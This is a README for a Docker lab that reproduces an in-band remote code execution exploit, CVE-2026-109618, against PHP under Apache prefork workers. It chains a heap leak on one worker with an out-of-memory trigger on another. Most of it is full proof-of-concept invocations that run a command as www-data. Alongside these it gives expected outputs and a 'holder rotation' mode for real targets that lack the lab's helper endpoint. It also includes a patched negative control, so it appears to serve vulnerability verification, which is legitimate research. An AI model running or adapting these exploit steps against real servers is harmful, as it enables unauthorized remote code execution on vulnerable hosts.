# lab-109618-fork — in-band CVE-2026-109618

Four prefork workers forked from one Apache parent. All workers share the
libphp and ZendMM chunk mappings, so the 109619 leak can run on a 128M
worker and the 109618 OOM fire on a **different, fresh 8M worker** using
the same addresses.

```sh
docker compose up -d
python3 ../poc/verify_109618_inband.py \
    --target 127.0.0.1:18152 --cmd id \
    --leak-path /hi/index.php --fire-path /lo/index.php \
    --worker-id /lo/pid.php --proof lo/p --offset 0x67400
```

Expected: `[EVIDENCE] IN-BAND 109618 RCE REPRODUCED`, proof
`uid=33(www-data) ...` fetched over HTTP from `/lo/p`.

- `/hi` — 128M, `php.ini-production` + 1G post limit; leak profile.
- `/lo` — per-directory `memory_limit=8M`, 1G post limit; fire profile.
- `/lo/pid.php` — lab worker identity (the POC uses it to avoid the leak
  worker; a real target would rotate holders and retry).
- The webroot is writable so the proof is read over HTTP, not `/proc`.

Patched negative control (8.4.27, behind `patched` on :18153):

```sh
docker compose up -d patched
python3 ../poc/verify_109618_inband.py --target 127.0.0.1:18153     --cmd id --leak-path /hi/index.php --fire-path /lo/index.php     --worker-id /lo/pid.php --proof lo/p --offset 0x67400
# expected: rc 1, "[!] in-band leak failed: no heap pointers in leak window"
```

Targets without a `pid.php` endpoint use holder rotation:

```sh
python3 ../poc/verify_109618_inband.py --target 127.0.0.1:18152     --cmd id --leak-path /hi/index.php --fire-path /lo/index.php     --worker-id none --proof lo/p --offset 0x67400 --retries 6
```

No `/proc` address reads and no debugger are used by the POC. The
lab-assisted control (`poc/verify_109618_zif.py` + `lab-109618/`) remains
separate and is the only place `/proc` is used.
